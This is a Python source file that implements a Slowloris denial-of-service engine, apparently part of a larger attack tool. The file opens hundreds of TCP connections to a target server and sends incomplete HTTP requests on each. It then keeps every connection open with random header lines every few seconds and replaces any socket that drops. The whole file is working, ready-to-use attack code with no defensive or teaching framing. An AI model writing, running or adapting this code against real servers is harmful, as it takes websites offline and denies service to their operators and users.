import socket
import time
import random
import threading
from core.stats import AttackStats
from utils.user_agents import random_ua

class SlowlorisEngine:
    def __init__(
        self,
        target_ip: str,
        target_port: int = 80,
        num_connections: int = 400,
        duration: int = 37,
        stats: AttackStats = None,
        host_header: str = "",
    ):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.duration = duration
        self.stats = stats or AttackStats()
        self.host_header = host_header or target_ip
        self._running = False
        self._sockets = []
        self._lock = threading.Lock()

    def _create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target_ip, self.target_port))
            ua = random_ua()
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.host_header}\r\nUser-Agent: {ua}\r\nAccept: text/html,*/*\r\n".encode())
            return sock
        except (socket.timeout, ConnectionRefusedError, OSError):
            self.stats.record_error("connection")
            return None

    def _keep_alive(self, sock):
        try:
            sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
            return True
        except (socket.timeout, OSError, AttributeError):
            return False

    def run(self):
        self._running = True
        self.stats.reset()

        with self._lock:
            for _ in range(self.num_connections):
                sock = self._create_socket()
                if sock:
                    self._sockets.append(sock)
                    self.stats.active_connections = len(self._sockets)

        while self._running:
            with self._lock:
                alive = []
                for sock in self._sockets:
                    if self._keep_alive(sock):
                        alive.append(sock)
                    else:
                        self.stats.record_error("connection")
                        new = self._create_socket()
                        if new:
                            alive.append(new)
                self._sockets = alive
                self.stats.active_connections = len(self._sockets)

            missing = self.num_connections - len(self._sockets)
            for _ in range(missing):
                sock = self._create_socket()
                if sock:
                    with self._lock:
                        self._sockets.append(sock)
                        self.stats.active_connections = len(self._sockets)

            time.sleep(random.uniform(8, 15))

        self.stop()

    def stop(self):
        self._running = False
        with self._lock:
            for sock in self._sockets:
                try:
                    sock.close()
                except OSError:
                    pass
            self._sockets.clear()
            self.stats.active_connections = 0
